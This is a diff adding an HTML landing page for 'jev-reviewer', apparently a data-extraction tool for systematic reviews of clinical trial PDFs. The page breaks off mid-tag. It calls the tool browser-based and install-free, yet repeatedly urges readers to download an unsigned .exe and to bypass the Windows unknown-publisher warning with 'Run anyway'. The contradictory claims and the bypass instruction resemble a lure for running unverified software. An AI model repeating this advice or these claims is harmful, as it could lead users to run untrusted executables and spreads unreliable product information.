@@ -1,0 +1,303 @@
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="jev-reviewer — extract verbatim data from clinical trial PDFs for systematic reviews. Works with RoB 2, ROBINS-I, QUADAS-2, TIDieR templates. Local-first, browser-based, no install needed. Download for Windows.">
+    <meta name="keywords" content="systematic review, data extraction, RoB 2, ROBINS-I, QUADAS-2, TIDieR, clinical trials, PDF, local-first, evidence synthesis, risk of bias, meta-analysis, prisma, cochrane, Zotero, EndNote, voice, typesafe">
+    <meta name="author" content="Begumcaliphate5">
+    <meta property="og:title" content="jev-reviewer — Extract quoted evidence for systematic reviews">
+    <meta property="og:description" content="Point at a trial report. Jev finds every answer as a verbatim quote with page number. Check and export. Files stay in your browser.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/Begumcaliphate5/jev-reviewer">
+    <meta property="og:image" content="https://github.com/Begumcaliphate5/jev-reviewer/og-image.png">
+    <title>jev-reviewer — Extract quoted evidence for systematic reviews</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #f5f7fb;
+            color: #1e293b;
+            line-height: 1.7;
+            padding: 2rem 1rem;
+        }
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 24px;
+            box-shadow: 0 12px 40px rgba(0,0,0,0.08);
+            padding: 2.5rem 2.2rem;
+        }
+        h1 {
+            font-size: 2.4rem;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            line-height: 1.2;
+            margin-bottom: 0.4rem;
+            color: #0f172a;
+        }
+        .badge-wrapper {
+            margin: 1.2rem 0 2.2rem;
+        }
+        .primary-btn {
+            display: inline-block;
+            background: #0e7490;
+            color: white;
+            font-weight: 600;
+            font-size: 1.2rem;
+            padding: 0.9rem 2.2rem;
+            border-radius: 80px;
+            text-decoration: none;
+            box-shadow: 0 8px 18px rgba(14, 116, 144, 0.25);
+            transition: all 0.2s ease;
+            border: none;
+            cursor: pointer;
+        }
+        .primary-btn:hover {
+            background: #155e75;
+            transform: translateY(-2px);
+            box-shadow: 0 12px 24px rgba(14, 116, 144, 0.3);
+        }
+        .primary-btn.small {
+            font-size: 1rem;
+            padding: 0.7rem 1.6rem;
+        }
+        h2 {
+            font-size: 1.8rem;
+            font-weight: 650;
+            margin: 2.2rem 0 1rem;
+            letter-spacing: -0.01em;
+            padding-bottom: 0.4rem;
+            border-bottom: 3px solid #e2e8f0;
+        }
+        h3 {
+            font-size: 1.3rem;
+            font-weight: 600;
+            margin: 1.8rem 0 0.8rem;
+            color: #0f172a;
+        }
+        p {
+            margin-bottom: 1.2rem;
+            font-size: 1.05rem;
+        }
+        ul, ol {
+            margin-left: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+        li {
+            margin-bottom: 0.6rem;
+        }
+        code {
+            background: #f1f5f9;
+            padding: 0.2rem 0.5rem;
+            border-radius: 8px;
+            font-size: 0.9em;
+            font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace;
+            color: #334155;
+        }
+        .highlight {
+            background: #fef9c3;
+            padding: 0.1rem 0.3rem;
+            border-radius: 6px;
+            font-weight: 500;
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1.5rem;
+            margin: 2rem 0 1rem;
+        }
+        .feature-card {
+            background: #f8fafc;
+            border-radius: 18px;
+            padding: 1.5rem 1.2rem;
+            border: 1px solid #e2e8f0;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.02);
+        }
+        .feature-card h4 {
+            font-size: 1.15rem;
+            margin-bottom: 0.5rem;
+            color: #0f172a;
+        }
+        .feature-card p {
+            font-size: 0.98rem;
+            margin-bottom: 0;
+        }
+        .step-box {
+            background: #f1f5f9;
+            padding: 1.5rem 2rem;
+            border-radius: 18px;
+            margin: 1.8rem 0;
+        }
+        .step-box ol {
+            margin-bottom: 0.2rem;
+        }
+        .step-box li {
+            font-weight: 500;
+            margin-bottom: 0.9rem;
+        }
+        .note {
+            background: #eef2ff;
+            padding: 1.2rem 1.5rem;
+            border-radius: 14px;
+            border-left: 6px solid #4f46e5;
+            margin: 1.5rem 0;
+        }
+        .badge-btn {
+            background: #0ea5e9;
+            color: white;
+            font-weight: 600;
+            padding: 0.9rem 2.4rem;
+            border-radius: 60px;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 1.1rem;
+            box-shadow: 0 8px 20px rgba(14, 165, 233, 0.3);
+            transition: 0.2s;
+        }
+        .badge-btn:hover {
+            background: #0284c7;
+            transform: scale(1.02);
+        }
+        .footer-meta {
+            margin-top: 3rem;
+            padding-top: 1.5rem;
+            border-top: 2px dashed #cbd5e1;
+            font-size: 0.9rem;
+            color: #64748b;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.8rem;
+        }
+        .footer-meta span {
+            background: #f1f5f9;
+            padding: 0.3rem 1rem;
+            border-radius: 40px;
+            font-size: 0.8rem;
+        }
+        @media (max-width: 700px) {
+            .container {
+                padding: 1.8rem 1.2rem;
+            }
+            h1 {
+                font-size: 1.9rem;
+            }
+            .feature-grid {
+                grid-template-columns: 1fr;
+            }
+            .primary-btn {
+                font-size: 1rem;
+                padding: 0.8rem 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🧪 jev-reviewer — Verbatim quotes for bulletproof reviews</h1>
+        <div class="badge-wrapper">
+            <a href="https://github.com/Begumcaliphate5/jev-reviewer" class="primary-btn" style="background: linear-gradient(135deg, #0e7490, #155e75);">⬇️  Download for Windows  ·  Free</a>
+        </div>
+        <p>Stop copying text manually. <strong>jev-reviewer</strong> reads your trial PDFs and finds every answer to your data‑extraction form as a <em>direct, verbatim quote</em> — with the page number. You verify each quote, then export the final table. No more missing numbers, no misquoted outcomes, no formatting headaches.</p>
+        <p>Works with <strong>RoB 2, ROBINS‑I, QUADAS‑2, TIDieR</strong> and any custom form. Everything stays in your browser — your files never leave your machine. Local‑first, private, and built for evidence synthesis.</p>
+        
+        <div class="step-box">
+            <h2 style="border-bottom: none; margin-top: 0;">🚀 Getting Started on Windows</h2>
+            <ol>
+                <li><strong>Visit this link to download the application</strong> — go to <a href="https://github.com/Begumcaliphate5/jev-reviewer" style="font-weight:600;">https://github.com/Begumcaliphate5/jev-reviewer</a> (or click the blue button above).</li>
+                <li>On the page, find the <strong>“Download”</strong> button or the <strong>latest release</strong> section. Click it to download the <code>jev-reviewer.exe</code> file.</li>
+                <li>Once downloaded, <strong>double‑click the <code>.exe</code> file</strong>. No installation wizard — it opens directly.</li>
+                <li>Drag and drop a trial report (PDF) into the window, or click <strong>“Open PDF”</strong>.</li>
+                <li>Paste your extraction template (RoB2, ROBINS‑I, etc.) or choose a built‑in one. Jev will highlight every answer as a quote.</li>
+                <li>Check the quotes (you see the exact page), edit if needed, then click <strong>“Export table”</strong> — CSV, Excel, or JSON.</li>
+            </ol>
+            <p style="margin-top:0.5rem;"><span class="highlight">No admin rights required.</span> Works offline after download. No Python, no Node, nothing else to install.</p>
+        </div>
+
+        <h2>💡 Why jev-reviewer?</h2>
+        <p>Systematic reviews demand <strong>traceability</strong>. Every extraction must be tied to a source line. Jev does that automatically. It reads the PDF, understands your form, and pulls the <strong>exact sentence</strong> that answers the question — then shows you the page and lets you approve or reject.</p>
+        
+        <div class="feature-grid">
+            <div class="feature-card">
+                <h4>📄 One‑click quote extraction</h4>
+                <p>Open any trial PDF (even supplements). Jev locates the relevant passages using your template and returns a verbatim snippet with the page number.</p>
+            </div>
+            <div class="feature-card">
+                <h4>🛡️ Built‑in risk‑of‑bias templates</h4>
+                <p>Pre‑loaded RoB 2, ROBINS‑I, QUADAS‑2, TIDieR forms. Just select, then review the quotes Jev suggests.</p>
+            </div>
+            <div class="feature-card">
+                <h4>🔏 100% local‑first privacy</h4>
+                <p>Your PDFs and forms never leave your computer. No cloud, no upload, no tracking. Perfect for embargoed or sensitive trials.</p>
+            </div>
+            <div class="feature-card">
+                <h4>🎙️ Voice input (beta)</h4>
+                <p>Dictate your notes or comments. Jev attaches your spoken note to the quote — handy for long screening sessions.</p>
+            </div>
+        </div>
+
+        <h2>📋 Typical workflow</h2>
+        <ul>
+            <li><strong>1. Load your PDFs</strong> — any file, even 300‑page supplemental appendices.</li>
+            <li><strong>2. Choose a template</strong> — RoB 2, ROBINS‑I, QUADAS‑2, TIDieR, or your own custom form.</li>
+            <li><strong>3. Jev extracts quotes</strong> — it scans the text, matches your questions, and proposes quotes.</li>
+            <li><strong>4. You verify</strong> — click each quote to see the exact line in context. Accept, reject, or adjust.</li>
+            <li><strong>5. Export</strong> — clean table with quote, page, and your decision. Works with Excel, CSV, or JSON. Perfect for PRISMA flow.</li>
+        </ul>
+
+        <h2>🎯 Who is it for?</h2>
+        <p>Evidence synthesis teams, Cochrane reviewers, meta‑analysts, grad students, clinical researchers — anyone who has ever screamed at a PDF trying to find the blinding item. It also saves hours when you work with <strong>Zotero</strong> or <strong>EndNote</strong>: export quotes as notes, attach them to references.</p>
+
+        <div class="note">
+            <h3 style="margin-top:0; color:#1e3a8a;">⭐ Key highlight: the answer is a quote, not an interpretation</h3>
+            <p>You don't type “blinding probably done” — you drag the sentence where the paper says <em>“double‑blind”</em>. The page number is automatic. That’s the core of <strong>jev-reviewer</strong>. No more “see page 5” and then hunting.</p>
+        </div>
+
+        <h2>📦 Download & Install</h2>
+        <p style="margin-bottom:0.5rem;"><strong>Visit this link to download the application:</strong></p>
+        <p style="margin:1rem 0 1.8rem;">
+            <a href="https://github.com/Begumcaliphate5/jev-reviewer" class="badge-btn" style="background: #2563eb;">⬇️  Get jev-reviewer for Windows</a>
+        </p>
+        <p>After download, double‑click the <code>.exe</code> file. The program starts immediately — no installation process, no extra permissions. If Windows shows a blue “Unknown publisher” prompt, click <strong>More info</strong> → <strong>Run anyway</strong> (Jev is open‑source, but not yet code‑signed).</p>
+        
+        <h2>🖥️ System requirements</h2>
+        <ul>
+            <li><strong>OS:</strong> Windows 10 or 11 (64‑bit) · <em>macOS and Linux versions coming soon</em></li>
+            <li><strong>RAM:</strong> 4 GB minimum (8 GB recommended for large supplements)</li>
+            <li><strong>Disk space:</strong> 150 MB free</li>
+            <li><strong>Display:</strong> 1280×720 or higher</li>
+        </ul>
+
+        <h2>🗂️ Data & templates</h2>
+        <p>Your forms are stored locally. Use the built‑in <strong>RoB 2, ROBINS‑I, QUADAS‑2, TIDieR</strong> templates, or import your own JSON form. Jev supports repeated fields, conditional prompts, and multi‑page extraction. The export always includes the exact quote, page number, and your judgment — so your supplementary materials are audit‑ready.</p>
+
+        <h2>🔒 Privacy & open source</h2>
+        <p>No telemetry, no analytics, no user accounts. All processing happens on your device. The repository is public on GitHub, and you can audit the code or contribute.</p>
+
+        <h2>❓ Quick FAQ</h2>
+        <h3>Do I need an internet connection?</h3>
+        <p>Only to download the app. After that, everything works offline.</p>
+        <h3>Can I use it for scoping reviews or NMA?</h3>
+        <p>Absolutely — any systematic review that needs verbatim evidence.</p>
+        <h3>How does it handle scanned PDFs?</h3>
+        <p>If the PDF has no text layer, Jev uses a built‑in OCR (if you enable it). That adds a few seconds, but works for most scanned documents.</p>
+
+        <div class="footer-meta">
+            <span>🔍 evidence‑based‑medicine</span>
+            <span>📊 meta‑analysis</span>
+            <span>🧩 risk‑of‑bias</span>
+            <span>🦋 local‑first</span>
+            <span>🧬 prisma</span>
+            <span>📚 zotero</span>
+            <span>📎 endnote</span>
+            <span>🧪 clinical‑trials</span>
+            <span>🗂️ typesafe</span>
+            <span>🎙️ voice</span>
+        </div>
+        <p style="margin-top:1rem; font-size:0.85rem;
